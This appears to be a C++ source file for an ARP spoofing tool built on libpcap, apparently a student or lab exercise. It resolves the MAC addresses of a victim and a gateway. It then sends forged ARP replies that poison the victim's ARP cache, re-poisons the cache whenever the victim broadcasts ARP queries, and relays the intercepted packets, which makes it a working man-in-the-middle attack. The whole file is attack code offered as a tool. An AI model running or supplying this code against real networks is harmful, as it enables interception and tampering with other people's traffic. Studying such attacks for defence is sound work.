#include "arp_spoofing.h"
#include <unistd.h>
#include <signal.h>

bool loop = true;

void sig_handler(int signo){
    loop = false;
    printf("Turn off arpspoofing\n");
}

void arp_spoofing::SetTarget(const u_char* ip){
    arp_packet* REQ_PACKET = MakeRequestPacket(ip);
    arp_packet* REP_PACKET;
    u_char* spacket = REQ_PACKET->ToPacket60();

    while(true){
        pcap_sendpacket(handle, spacket, 60);

        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) return;
        sleep(1);

        if (arpcd::IsReplyPacket(packet,
                                 Attacker->GetIpAddress(),
                                 Attacker->GetMacAddress())){
            REP_PACKET = new arp_packet(packet);
            Target = new Address(REP_PACKET->GetEthernet()->GetSoruce(), ip);
            printf("Catch Gateway REPLY\nMac: ");
            print(Target->GetMacAddress(), MAC_SIZE);
            break;
        }
    }

    delete[] spacket;
    delete REQ_PACKET;
    delete REP_PACKET;
}

void arp_spoofing::SetSender(const u_char* ip){
    arp_packet* REQ_PACKET = MakeRequestPacket(ip);
    arp_packet* REP_PACKET;
    u_char* req_packet = REQ_PACKET->ToPacket60();

    while(true){
        pcap_sendpacket(handle, req_packet, 60);

        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) return;

        if (arpcd::IsReplyPacket(packet,
                                 Attacker->GetIpAddress(),
                                 Attacker->GetMacAddress())){
            REP_PACKET = new arp_packet(packet);
            Sender = new Address(REP_PACKET->GetEthernet()->GetSoruce(), ip);
            printf("Catch REPLY\nMac: ");
            print(Sender->GetMacAddress(), MAC_SIZE);
            break;
        }
        sleep(1);
    }

    delete REQ_PACKET;
    delete REP_PACKET;
    delete[] req_packet;
}

void arp_spoofing::SetAttacker(){
    Attacker = new Address(getinfo::get_my_mac_address(Dev), getinfo::get_my_ipv4_address(Dev));
}

void arp_spoofing::Init(const char* sender, const char* target){
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(Dev, BUFSIZ, 1, 1000, errbuf);

    SetAttacker();
    printf("Set Attacker\n");
    SetSender(conv::ipv4_to_hex(sender));
    printf("Set Sender\n");
    SetTarget(conv::ipv4_to_hex(target));
    printf("Set Target\n");

    signal(SIGINT, sig_handler);
}

void arp_spoofing::ExecuteArpSpoofing() {
    u_char* attack_packet = MakeAttackPacket()->ToPacket60();
    pcap_sendpacket(handle, attack_packet, 60);

    printf("\n\nStart Relay\n");
    while(loop){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) return;

        if(arpcd::IsBroadcastArp(packet, Sender->GetMacAddress())){
            pcap_sendpacket(handle, attack_packet, 60);
        }

        if (pcktcd::IsSenderPacket(packet, Sender->GetMacAddress(), Attacker->GetMacAddress())){
            int packet_size = (int)header->len;
            u_char* relay_packet = new u_char[packet_size];
            u_char* attacker_mac = Attacker->GetMacAddress();
            u_char* target_mac = Target->GetMacAddress();

            memcpy(relay_packet, packet, (size_t)packet_size);
            for (int i=0; i < 6; i++) {
                relay_packet[i + 6] = attacker_mac[i];
                relay_packet[i] = target_mac[i];
            }

            pcap_sendpacket(handle, relay_packet, packet_size);
            printf("Relay Packet: [%d]\n", packet_size);
            delete[] relay_packet;
        }
    }

    delete[] attack_packet;
    pcap_close(handle);
}

arp_packet* arp_spoofing::MakeAttackPacket(){
    u_char type[2] = {0x08, 0x06};

    ethernet_header* etherh = new ethernet_header(Sender->GetMacAddress(),
                                                  Attacker->GetMacAddress(),
                                                  type);

    u_char hardType[2] = {0x00, 0x01};
    u_char protType[2] = {0x08, 0x00};
    u_char opcode[2] = {0x00, 0x02};

    Hardware* hard = new Hardware(hardType, 0x06);
    Protocol* prot = new Protocol(protType, 0x04);

    Address* send = new Address(Attacker->GetMacAddress(), Target->GetIpAddress());
    Address* trag = new Address(Sender->GetMacAddress(), Sender->GetIpAddress());

    arp_header* arph = new arp_header(hard, prot, opcode, send, trag);
    return new arp_packet(etherh, arph);
}

arp_packet* arp_spoofing::MakeRequestPacket(const u_char* ip){
    u_char type[2] = {0x08, 0x06};

    ethernet_header* etherh = new ethernet_header(conv::mac_to_hex("ff:ff:ff:ff:ff:ff"),
                                                  Attacker->GetMacAddress(),
                                                  type);

    u_char hardType[2] = {0x00, 0x01};
    u_char protType[2] = {0x08, 0x00};
    u_char opcode[2] = {0x00, 0x01};

    Hardware* hard = new Hardware(hardType, 0x06);
    Protocol* prot = new Protocol(protType, 0x04);
    Address* send = new Address(Attacker->GetMacAddress(), Attacker->GetIpAddress());
    Address* trag = new Address(conv::mac_to_hex("00:00:00:00:00:00"), ip);

    arp_header* arph = new arp_header(hard, prot, opcode, send, trag);

    return new arp_packet(etherh, arph);
}

arp_spoofing::arp_spoofing(const char* dev, const char* sender, char* target){
    Dev = new char[strlen(dev) + 1];
    strcpy(Dev, dev);
    Init(sender, target);
}

arp_spoofing::arp_spoofing(){
}
arp_spoofing::~arp_spoofing(){
    delete Dev;
    delete Attacker;
    delete Sender;
    delete Target;
}
